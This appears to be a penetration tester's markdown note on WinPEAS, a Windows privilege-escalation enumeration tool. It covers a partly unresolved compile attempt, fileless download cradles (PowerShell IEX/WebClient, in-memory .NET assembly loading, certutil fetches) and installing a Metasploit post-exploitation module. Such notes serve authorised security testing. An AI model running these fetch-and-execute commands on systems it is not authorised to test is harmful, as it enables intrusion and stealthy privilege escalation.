# WinPEAS

> [!INFO]
> There are 3 programs made in different programming languages and they are C#, batch and PowerShell.

## 01 - Compile

Install a targeting pack from this [link](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net481). Then compile `WinPEAS`.

TODO: figure it out how to manually compile WinPEAS in C#

```
C:\> git clone https://github.com/carlospolop/PEASS-ng.git

C:\> cd PEASS-ng\winPEAS\winPEASexe\winPEAS

C:\PEASS-ng\winPEAS\winPEASexe\winPEAS> copy Program.cs Program.cs.bak

C:\PEASS-ng\winPEAS\winPEASexe\winPEAS> dotnet new console --force

C:\PEASS-ng\winPEAS\winPEASexe\winPEAS> dotnet add package Microsoft.VisualStudio.UnitTesting --version 11.0.50727.1

C:\PEASS-ng\winPEAS\winPEASexe\winPEAS> del Program.cs; move Program.cs.bak Program.cs
```

_**I'm still having an error**_

```
C:\PEASS-ng\winPEAS\winPEASexe\winPEAS> dotnet build -c Release -p:TargetFrameworkVersion=v4.8.1
```

## 02 - Download Cradle

### 2.1 - .NET

```powershell
$url = 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe'

$wp = [System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```

### 2.2 - PowerShell

```
C:\> powershell.exe "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"

PS C:\> IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1")
```

### 2.3 - Command Prompt

```
C:\> certutil.exe -urlcache -split -f https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat winPEAS.bat

C:\> curl.exe -o winPEAS.bat https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat
```

## 03 - #metasploit

```
$ sudo cp peass.rb /usr/share/metasploit-framework/modules/post/multi/gather/

$ sudo wget -O /usr/share/metasploit-framework/modules/post/multi/gather/peass.rb https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/metasploit/peass.rb

msf > reload_all
```

---
## References

### Source Repositories

- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

- [WinPEAS Metasploit Module](https://github.com/carlospolop/PEASS-ng/tree/master/metasploit)